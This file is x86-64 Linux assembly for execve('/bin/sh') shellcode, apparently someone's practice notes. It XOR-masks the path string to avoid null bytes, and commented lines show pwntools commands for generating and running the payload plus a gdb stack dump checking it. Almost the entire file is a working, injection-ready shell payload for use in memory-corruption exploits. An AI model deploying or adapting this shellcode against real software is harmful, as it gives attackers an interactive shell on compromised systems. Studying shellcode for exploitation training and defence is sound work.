global _start
section .text
_start:
    mov rax,  0x101010101010101
    push   rax
    mov rax,  0x169722e6f68632e
    xor [rsp],  rax
    mov    rdi,  rsp
    mov rax,  0x101010101010101
    push   rax
    mov rax,  0x169722e6f68632e
    xor    [rsp],  rax
    xor    esi,  esi
    push   rsi
    push   0x8
    pop    rsi
    add    rsi,  rsp
    push   rsi
    mov    rsi,  rsp
    xor    edx,  edx
    push   0x3b
    pop    rax
    syscall

;from pwn import *
;context(os="linux", arch="amd64", log_level="error")
;dir(shellcraft)
;syscall = shellcraft.execve(path='/bin/sh',argv=['/bin/sh'])
;asm(syscall).hex()
;run_shellcode(unhex('48b8...2605')).interactive()

;pwn asm 'push rax'  -c 'amd64'
;pwn disasm '50' -c 'amd64'
;pwn disasm '48b8...af05' -c 'amd64'

;(gdb) info register rax rdi rsi rdx rsp
;rax            0x3b                59
;rdi            0x7fffffffdf18      140737488346904
;rsi            0x7fffffffdf00      140737488346880
;rdx            0x0                 0
;rsp            0x7fffffffdf00      0x7fffffffdf00
;(gdb) x/6xg $rsp
;0x7fffffffdf00: 0x00007fffffffdf10      0x0000000000000000
;0x7fffffffdf10: 0x0068732f6e69622f      0x0068732f6e69622f
;0x7fffffffdf20: 0x0000000000000001      0x00007fffffffe1a4